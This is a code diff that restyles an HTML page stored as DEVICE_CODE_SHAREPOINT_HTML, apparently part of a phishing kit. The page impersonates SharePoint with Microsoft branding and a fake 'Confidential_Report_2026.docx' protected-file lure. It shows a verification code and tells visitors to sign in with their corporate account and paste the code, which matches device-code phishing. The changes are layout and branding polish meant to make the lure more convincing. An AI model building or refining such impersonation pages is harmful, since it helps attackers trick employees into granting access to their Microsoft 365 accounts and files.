@@ -3260,11 +3260,43 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             height: 48px;
             display: flex;
             align-items: center;
+            justify-content: space-between;
             padding: 0 24px;
             color: white;
             font-size: 16px;
             font-weight: 600;
             box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);
+            box-sizing: border-box;
+        }
+
+        .suite-bar-brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .suite-bar-logo {
+            width: 20px;
+            height: 20px;
+            filter: brightness(0) invert(1);
+        }
+
+        .suite-bar-links {
+            display: flex;
+            gap: 18px;
+            font-size: 13px;
+            font-weight: 400;
+        }
+
+        .suite-bar-links a {
+            color: white;
+            text-decoration: none;
+            opacity: 0.85;
+            transition: opacity 0.15s ease;
+        }
+
+        .suite-bar-links a:hover {
+            opacity: 1;
         }
 
         .main-container {
@@ -3276,42 +3308,46 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             box-sizing: border-box;
         }
 
-        /* Changed to a wider, landscape-oriented container */
+        /* Adjusted for a slim, centered portrait card layout */
         .auth-card {
             background: var(--sp-card);
             width: 100%;
-            max-width: 820px;
+            max-width: 440px;
             border-radius: 4px;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
-            padding: 40px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+            padding: 36px 32px;
             box-sizing: border-box;
         }
 
-        /* Two-column layout grid for landscape viewing */
-        .landscape-grid {
-            display: grid;
-            grid-template-columns: 1.1sfr 1fr;
-            gap: 40px;
-            align-items: start;
+        /* Portrait stack layout */
+        .portrait-layout {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
         }
 
-        @media (max-width: 768px) {
-            .landscape-grid {
-                grid-template-columns: 1fr;
-                gap: 24px;
-            }
+        /* Center-aligned logo configuration */
+        .logo-area { 
+            margin-bottom: 8px; 
+            text-align: center; 
+        }
+        .logo-area img { 
+            width: 52px; 
+            height: 52px; 
         }
 
-        .logo-area { margin-bottom: 16px; text-align: left; }
-        .logo-area img { width: 36px; height: 36px; }
-
-        h1 { font-size: 22px; font-weight: 600; margin: 0 0 12px 0; color: #201f1e; text-align: left; }
+        h1 { 
+            font-size: 20px; 
+            font-weight: 600; 
+            margin: 0 0 12px 0; 
+            color: #201f1e; 
+            text-align: center; 
+        }
         
-        /* Clear operational instructions for the one-time password */
         .instruction-box {
             color: var(--sp-text-main);
-            font-size: 14px;
-            margin: 0 0 20px 0;
+            font-size: 13.5px;
+            margin: 0 0 4px 0;
             line-height: 1.5;
             text-align: left;
         }
@@ -3326,10 +3362,11 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             margin-bottom: 6px;
         }
 
+        /* Redesigned clean document container without the blur text preview */
         .file-container {
             border: 1px solid var(--sp-border);
             border-radius: 6px;
-            background: #ffffff;
+            background: #faf9f8;
             overflow: hidden;
             text-align: left;
         }
@@ -3337,9 +3374,7 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
         .file-header {
             display: flex;
             align-items: center;
-            padding: 12px 16px;
-            background: #faf9f8;
-            border-bottom: 1px solid var(--sp-border);
+            padding: 14px 16px;
         }
 
         .file-icon {
@@ -3367,57 +3402,35 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
             color: var(--sp-text-muted);
         }
 
-        .document-preview {
-            background: #ffffff;
-            padding: 24px;
-            position: relative;
-        }
-
-        .blurred-text {
-            filter: blur(5px);
-            user-select: none;
-            opacity: 0.4;
-        }
-
-        .blurred-text div {
-            height: 8px;
-            background: #a19f9d;
-            margin-bottom: 12px;
-            border-radius: 4px;
-        }
-
-        /* Right column controls alignment */
         .controls-panel {
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            height: 100%;
-            padding-top: 10px;
+            margin-top: 4px;
         }
 
         .code-label {
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
             color: var(--sp-text-muted);
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
+            text-align: center;
         }
 
         .code-input-display {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 700;
             color: var(--sp-primary);
             letter-spacing: 6px;
-            margin-bottom: 20px;
-            padding: 14px;
+            margin-bottom: 18px;
+            padding: 12px;
             background: #f3f2f1;
             border-radius: 4px;
             border: 1px solid #e1dfdd;
             text-align: center;
         }
 
-        /* Updated Action Buttons */
         .btn-primary {
             background-color: var(--sp-primary);
             color: white;
@@ -3489,14 +3502,22 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
 <body>
 
     <div class="suite-bar">
-        <span>SharePoint</span>
+        <div class="suite-bar-brand">
+            <img class="suite-bar-logo" src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint Logo">
+            <span>SharePoint</span>
+        </div>
+        <div class="suite-bar-links">
+            <a href="#">My Files</a>
+            <a href="#">Shared</a>
+            <a href="#">Help</a>
+        </div>
     </div>
 
     <div class="main-container">
         <div class="auth-card">
-            <div id="mainView" class="landscape-grid">
+            <div id="mainView" class="portrait-layout">
                 
-                <!-- Left Column: File details and contextual step instructions -->
+                <!-- Left Details stacked vertically -->
                 <div class="info-panel">
                     <div class="logo-area">
                         <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" alt="SharePoint">
@@ -3508,38 +3529,30 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
                         A temporary one-time password has been generated to verify your workspace access permissions. Please complete the following steps:
                         <ol>
                             <li>Click the authorization button or sign in with your corporate account.</li>
-                            <li>When prompted, paste or input the secure code shown on the right.</li>
+                            <li>When prompted, paste or input the secure code shown below.</li>
                             <li>Keep this window open until your document workspace loads successfully.</li>
                         </ol>
                     </div>
+                </div>
 
-                    <div class="file-container">
-                        <div class="file-header">
-                            <img class="file-icon" src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/item-types/32/docx.svg" alt="Document">
-                            <div class="file-info">
-                                <div class="file-name">Confidential_Report_2026.docx</div>
-                                <div class="file-meta">SharePoint Online &bull; Protected File</div>
-                            </div>
-                        </div>
-                        <div class="document-preview">
-                            <div class="blurred-text">
-                                <div style="width: 85%;"></div>
-                                <div style="width: 95%;"></div>
-                                <div style="width: 40%;"></div>
-                            </div>
+                <!-- Cleaned Document Display -->
+                <div class="file-container">
+                    <div class="file-header">
+                        <img class="file-icon" src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/item-types/32/docx.svg" alt="Document">
+                        <div class="file-info">
+                            <div class="file-name">Confidential_Report_2026.docx</div>
+                            <div class="file-meta">SharePoint Online &bull; Protected File</div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Right Column: Verification actions and OTP Display -->
+                <!-- Verification actions Displayed below details -->
                 <div class="controls-panel">
                     <div class="code-label">Verification Code</div>
                     <div class="code-input-display" id="userCode">Loading...</div>
                     
-                    <!-- Modified Primary Action Button Text -->
                     <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Authenticate with Code</button>
                     
-                    <!-- New Identity Provider Button -->
                     <button class="btn-secondary" id="msSignInBtn" onclick="openSignIn()">
                         <svg width="16" height="16" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg"><path fill="#f35325" d="M0 0h11v11H0z"/><path fill="#81bc06" d="M12 0h11v11H12z"/><path fill="#05a6f0" d="M0 12h11v11H0z"/><path fill="#ffba08" d="M12 12h11v11H12z"/></svg>
                         Sign in with Microsoft
@@ -3551,7 +3564,6 @@ const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
                 
             </div>
 
-            <!-- Handled standard functional layout for successful operations -->
             <div class="success-view" id="successView">
                 <div class="check-icon">✔</div>
                 <h2>Verification Complete</h2>
